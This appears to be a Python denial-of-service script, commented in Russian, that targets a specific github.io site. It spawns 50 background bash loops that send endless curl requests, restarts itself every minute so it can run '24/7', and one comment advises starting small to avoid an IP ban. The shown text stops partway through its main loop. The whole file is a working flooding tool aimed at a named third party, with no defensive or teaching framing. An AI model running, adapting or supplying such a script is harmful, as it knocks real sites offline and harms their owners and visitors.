import subprocess
import time
import sys
import os

TARGET = "https://srabakio.github.io/"
CONCURRENCY = 50  # Начни с малого, чтобы не забанили IP сразу
CHECK_INTERVAL = 60

def run_attack():
    """Запускает curl в фоне"""
    cmd = f"""
    for i in $(seq 1 {CONCURRENCY}); do
        while true; do
            curl -s -o /dev/null -w "%{{http_code}}" {TARGET} &
        done
    done
    wait
    """
    try:
        # Запускаем как фоновый процесс внутри Python
        process = subprocess.Popen(
            ["bash", "-c", cmd],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return process
    except Exception as e:
        print(f"[!] Error starting attack: {e}")
        return None

def main():
    print("[*] Starting 24/7 Attack on", TARGET)
    process = None
    
    while True:
        try:
            # Если процесс умер или его нет
            if process is None or process.poll() is not None:
                print("[*] Process died. Restarting...")
                process = run_attack()
                if process:
                    print("[*] Attack process restarted.")
            
            # Ждем минуту перед следующей проверкой
            time.sleep(CHECK_INTERVAL)
            
        except KeyboardInterrupt:
            print("\n[*] Stopping manually...")
            if process:
                process.terminate()
            break
        except Exception as e:
